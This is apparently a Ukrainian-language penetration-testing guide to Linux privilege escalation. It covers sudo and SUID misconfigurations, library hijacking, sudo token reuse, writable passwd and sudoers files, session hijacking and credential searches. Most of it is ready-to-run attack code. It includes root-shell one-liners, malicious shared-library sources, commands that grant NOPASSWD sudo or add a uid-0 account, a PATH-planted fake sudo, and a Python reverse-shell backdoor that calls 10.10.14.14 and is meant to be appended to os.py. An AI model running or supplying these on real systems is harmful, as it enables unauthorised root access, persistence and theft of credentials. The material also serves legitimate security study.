Вам може бути дозволено виконувати певні команди з використанням sudo, або ці бінарники можуть мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати і/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація sudo може дозволяти користувачу виконувати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`; отримати shell тепер тривіально — додавши ssh-ключ у каталог `root` або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **set an environment variable** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **based on HTB machine Admirer**, був **vulnerable** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну python бібліотеку під час виконання скрипта від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Обхід шляхів виконання sudo

**Jump** — щоб прочитати інші файли або використовувати **symlinks**. Наприклад, в sudoers файлі: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo команда/SUID бінарний файл без вказаного шляху до команди

Якщо надано **sudo дозвіл** для однієї команди **без вказування шляху**: _hacker10 ALL= (root) less_ ви можете exploit це, змінивши змінну PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** бінарник **виконує іншу команду без вказання шляху до неї (завжди перевіряйте вміст підозрілого SUID бінарника за допомогою** _**strings**_**)**).

[Приклади payload для виконання.](payloads-to-execute.md)

### SUID binary з вказаним шляхом до команди

Якщо **suid** бінарник **виконує іншу команду, вказуючи шлях**, тоді ви можете спробувати **export a function** з ім'ям тієї команди, яку викликає suid файл.

Наприклад, якщо suid бінарник викликає _**/usr/sbin/service apache2 start**_ потрібно спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid binary, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказання однієї або кількох спільних бібліотек (.so файлів), які завантажувач має завантажити перед усіма іншими, включно зі стандартною C-бібліотекою (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб зберегти безпеку системи й запобігти використанню цієї можливості для атак, особливо у випадку виконуваних файлів **suid/sgid**, система застосовує певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів з suid/sgid попередньо завантажуються лише бібліотеки зі стандартних шляхів, які також мають suid/sgid.

Ескалація привілеїв може відбутися, якщо у вас є можливість виконувати команди з `sudo`, і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатись і враховуватись навіть під час виконання команд з `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте це** використовуючи:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** запустивши
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Аналогічний privesc може бути використаний, якщо атакуючий контролює змінну оточення **LD_LIBRARY_PATH**, оскільки він контролює шлях, де будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли ви натрапляєте на binary з правами **SUID**, який виглядає підозріло, варто перевірити, чи він правильно завантажує файли **.so**. Це можна зробити, виконавши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, виявлення помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб експлуатувати це, слід створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, який містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпуляцій з дозволами файлів та запуску shell із підвищеними привілеями.

Скомпілюйте наведений C-файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має спровокувати exploit, що може призвести до компрометації системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує library з папки, у яку ми можемо записувати, давайте створимо library в цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримаєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована вами бібліотека повинна мати функцію під назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — курована добірка Unix бінарних файлів, які можуть бути використані зловмисником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **лише інжектувати аргументи** в команду.

Проект збирає легітимні функції Unix бінарників, які можна зловживати, щоб вийти з обмежених shell, підвищити або зберегти привілеї, передавати файли, створювати bind та reverse shells і полегшувати інші post-exploitation завдання.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи знаходить він спосіб експлуатації будь-якого правила sudo.

### Повторне використання sudo токенів

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете підвищити привілеї, **чекаючи виконання команди sudo та перехопивши сесіонний токен**.

Вимоги для підвищення привілеїв:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" повинен був **використати `sudo`** для виконання чогось **в останні 15 хвилин** (за замовчуванням це тривалість sudo токена, який дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово увімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінити `/etc/sysctl.d/10-ptrace.conf` і встановити `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете підвищити привілеї, використовуючи:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Перший **експлойт** (`exploit.sh`) створить бінарник `activate_sudo_token` в _/tmp_. Ви можете використати його, щоб **активувати sudo токен у вашій сесії** (ви не отримаєте автоматично root shell — виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_, **власником якого буде root і який матиме setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить файл sudoers**, що робить **sudo tokens вічними і дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у теці або для будь-якого файлу, створеного в ній, ви можете використати бінарник [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є shell під цим користувачем з PID 1234, ви можете **obtain sudo privileges** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root та групою root**.\
**Якщо** ви можете **читати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записувати** будь-який файл, ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо у вас є права на запис, ви можете ними зловживати.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD; не забудьте перевірити його конфігурацію у `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для ескалації привілеїв і ви отримали shell у контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконуватиме ваш код як root, а потім команду користувача. Далі — **змінити $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, виконувався ваш виконуваний файл sudo.

Зауважте, що якщо користувач використовує інший shell (не bash), вам потрібно буде змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або виконати щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Файл `/etc/ld.so.conf` вказує **звідки завантажуються файли конфігурацій**. Зазвичай цей файл містить такий рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть прочитані файли конфігурації з `/etc/ld.so.conf.d/*.conf`. Ці файли конфігурації **вказують на інші папки**, де **бібліотеки** будуть **шукатися**. Наприклад, вмісту `/etc/ld.so.conf.d/libc.conf` — це `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** в будь-якому з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якого файлу всередині `/etc/ld.so.conf.d/` або будь-якої папки, зазначеної у файлі конфігурації в `/etc/ld.so.conf.d/*.conf`, він може отримати підвищення привілеїв.\
Подивіться, **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіювання lib у `/var/tmp/flag15/` призведе до того, що програма використовуватиме її в цьому місці, як вказано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають **підмножину доступних root-привілеїв процесу**. Це фактично розбиває root **привілеї на менші й відмінні одиниці**. Кожну з цих одиниць можна незалежно надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про capabilities і як ними зловживати**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права директорій

У директорії біт **"execute"** означає, що відповідний користувач може "**cd**" у папку.\
Біт **"read"** означає, що користувач може **переглядати** **файли**, а біт **"write"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Access Control Lists (ACLs) представляють собою другий рівень дискреційних дозволів, здатний **перевизначати традиційні ugo/rwx права**. Ці дозволи підвищують контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або членами групи. Цей рівень **деталізації забезпечує більш точне управління доступом**. Детальніше можна знайти [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надати** користувачу "kali" права read і write на файл:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACL у системі:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell сесії

У **старих версіях** ви можете **hijack** деяку **shell** сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** до screen sessions лише **вашого власного користувача**. Однак, ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Перелік screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема у **old tmux versions**. Я не зміг захопити tmux (v2.1) session, створену root, будучи non-privileged user.

**Перелік tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** як приклад.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH ключі, згенеровані на системах на базі Debian (Ubuntu, Kubuntu тощо) у період з вересня 2006 по 13 травня 2008 року, можуть бути уражені цією помилкою.\
Ця помилка виникає при створенні нового ssh ключа в цих ОС, оскільки було можливе **лише 32,768 варіацій**. Це означає, що всі варіанти можна обчислити і, маючи публічний ssh-ключ, ви можете знайти відповідний приватний ключ. Ви можете знайти обчислені варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Вказує, чи дозволена автентифікація за паролем. Значення за замовчуванням — `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена автентифікація за публічним ключем. Значення за замовчуванням — `yes`.
- **PermitEmptyPasswords**: Якщо дозволена автентифікація за паролем, визначає, чи дозволяє сервер входи для облікових записів з порожнім паролем. Значення за замовчуванням — `no`.

### PermitRootLogin

Визначає, чи може root входити через ssh; значення за замовчуванням — `no`. Можливі значення:

- `yes`: root може входити за паролем та приватним ключем
- `without-password` or `prohibit-password`: root може входити лише за приватним ключем
- `forced-commands-only`: root може входити лише за приватним ключем і тільки якщо вказані опції команд
- `no` : заборонено

### AuthorizedKeysFile

Визначає файли, які містять публічні ключі, що можуть використовуватися для автентифікації користувача. Може містити токени на кшталт `%h`, які будуть замінені на домашній каталог. **Можна вказувати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вкаже, що якщо ви намагатиметесь увійти за допомогою **private** key користувача "**testusername**", ssh порівняє public key вашого ключа з тими, що розташовані в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) на сервері. Таким чином ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** located in your **initial host**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config` таким чином:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` має значення `*`, щоразу коли користувач підключається до іншої машини, ця машина зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписати** ці **опції** та дозволити або заборонити цю конфігурацію.\  
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — allow).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для ескалації привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються при запуску користувачем нового shell**. Тому, якщо ви можете **створювати або змінювати будь-який із них, ви можете ескалювати привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено дивний скрипт профілю, слід перевірити його на **чутливі дані**.

### Файли Passwd/Shadow

В залежності від OS файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або бути резервними копіями. Тому рекомендовано **знайти всі** та **перевірити, чи можна їх прочитати**, щоб побачити **чи є hashes** всередині файлів:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Іноді у файлі `/etc/passwd` (або його еквіваленті) можна знайти **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Доступний для запису /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з таких команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` і додайте згенерований пароль.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Альтернативно, ви можете використати наступні рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може погіршити поточний рівень безпеки машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: У BSD-платформах `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor виконається наступного разу, коли tomcat буде запущено.

### Перевірте папки

У наступних папках можуть міститися резервні копії або цікава інформація: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Можливо, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — відкритий додаток, що використовується для отримання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Журнали

Якщо ви можете читати журнали, ви можете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший журнал — тим цікавішим він, ймовірно, буде.\
Також деякі "**bad**" сконфігуровані (backdoored?) **журнали аудиту** можуть дозволити вам **записувати паролі** всередині журналів аудиту, як пояснюється в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи**, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ви також повинні перевіряти файли, що містять слово "**password**" у своїй **назві** або в **вмісті**, а також шукати IP-адреси та email-и у логах або регулярні вирази для хешів.\
Я не збираюся тут перераховувати, як робити все це, але якщо вам цікаво, ви можете переглянути останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконуватися python-скрипт і ви **можете записувати в** ту папку або можете **модифікувати python бібліотеки**, ви можете змінити бібліотеку os і backdoor її (якщо ви можете записувати туди, де виконуватиметься python-скрипт, скопіюйте та вставте бібліотеку os.py).

Щоб **backdoor the library**, просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP та PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Уразливість в `logrotate` дозволяє користувачам з **правами на запис** у файл журналу або в його батьківські директорії потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто запускається як **root**, можна примусити виконати довільні файли, особливо в директоріях типу _**/etc/bash_completion.d/**_. Важливо перевіряти права не тільки в _/var/log_, а й у будь-якій директорії, де застосовується ротація логів.

> [!TIP]
> Ця вразливість стосується `logrotate` версії `3.18.0` та старіших

Більш детальну інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Експлуатувати цю вразливість можна за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви виявите, що можете змінювати журнали, перевірте, хто ними керує, і чи можна підвищити привілеї, підставивши журнали як symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **змінити** існуючий, то ваша **system is pwned**.

Мережеві скрипти, наприклад _ifcg-eth0_, використовуються для мережевих підключень. Вони виглядають точно як файлові .INI. Однак вони \~sourced\~ в Linux через Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється некоректно. Якщо в імені є **пробіл/порожній символ, система намагається виконати частину після пробілу**. Це означає, що **все, що йде після першого пробілу, виконується як root**.

